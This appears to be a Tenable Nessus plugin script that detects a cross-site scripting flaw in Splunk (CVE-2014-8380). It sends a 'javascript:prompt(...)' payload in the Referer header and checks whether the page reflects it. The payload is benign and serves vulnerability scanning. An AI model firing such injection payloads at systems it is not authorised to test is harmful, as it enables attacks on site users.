#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(74243);
  script_version("1.11");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_cve_id("CVE-2014-8380");
  script_bugtraq_id(67655);

  script_name(english:"Splunk '/en-US/app/' Referer Header XSS");
  script_summary(english:"Attempts to inject script code via the referrer header.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Splunk hosted on the remote web server is affected by a
cross-site scripting vulnerability due to a failure to properly
sanitize user-supplied input to the 'Referer' HTTP header. An attacker
can exploit this issue to inject arbitrary HTML and script code into a
user's browser to be executed within the security context of the
affected site.");
  # https://packetstormsecurity.com/files/126813/Splunk-6.1.1-Cross-Site-Scripting.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?478b0c12");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/05/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/05/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:splunk:splunk");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2014-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("splunkd_detect.nasl", "splunk_web_detect.nasl");
  script_require_keys("installed_sw/Splunk");
  script_require_ports("Services/www", 8089, 8000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = "Splunk";

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8000, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);
script = SCRIPT_NAME - ".nasl" + '-' + unixtime();
attack = 'prompt("' + script + '");';
attack = 'javascript:' + urlencode(str:attack);

expected_output = '>This page was linked to from <a href="' + attack;

res = http_send_recv3(
  method : 'GET',
  port   : port,
  item   : dir + '/en-US/app/',
  fetch404     : TRUE,
  add_headers  : make_array('Referer', attack),
  exit_on_fail : TRUE
);

if (expected_output >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit the issue using the following request :' +
      '\n' +
      '\n' + http_last_sent_request() +
      '\n';
    if (report_verbosity > 1)
    {
      output =  extract_pattern_from_resp(
        string  : res[2],
        pattern : 'ST:'+expected_output
      );
      snip = crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30);
      report +=
        '\n' + 'This produced the following response :' +
        '\n' + snip +
        '\n' + output +
        '\n' + snip +
        '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
